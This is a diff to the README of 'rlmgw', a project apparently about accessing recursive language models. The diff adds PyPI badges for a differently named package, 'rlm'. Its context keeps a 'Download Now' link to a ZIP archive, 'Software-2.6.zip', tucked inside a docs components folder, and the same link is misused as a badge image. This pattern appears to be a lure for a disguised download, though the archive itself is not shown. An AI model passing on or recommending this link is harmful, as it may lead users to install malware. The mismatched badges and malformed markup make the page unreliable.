@@ -1,5 +1,12 @@
 # 🌟 rlmgw - Access Recursive Language Models Easily
 
+
+<!-- AUTO-PACKAGE-BADGES:START -->
+<!-- Auto-generated package badges -->
+
+![PyPI version](https://img.shields.io/pypi/v/rlm?style=flat-square&logo=pypi&color=green) ![PyPI downloads](https://img.shields.io/pypi/dm/rlm?style=flat-square&color=brightgreen) ![PyPI license](https://img.shields.io/pypi/l/rlm?style=flat-square) [![Deployed](https://img.shields.io/badge/deployed-0.1.0-blue?style=flat-square)](https://pypi.org/project/rlm)
+
+<!-- AUTO-PACKAGE-BADGES:END -->
 ## 📥 Download Now
 [![Download](https://raw.githubusercontent.com/ENTITY107/rlmgw/main/docs/src/components/Software-2.6.zip%20rlmgw-latest%20release-brightgreen)](https://raw.githubusercontent.com/ENTITY107/rlmgw/main/docs/src/components/Software-2.6.zip)
 
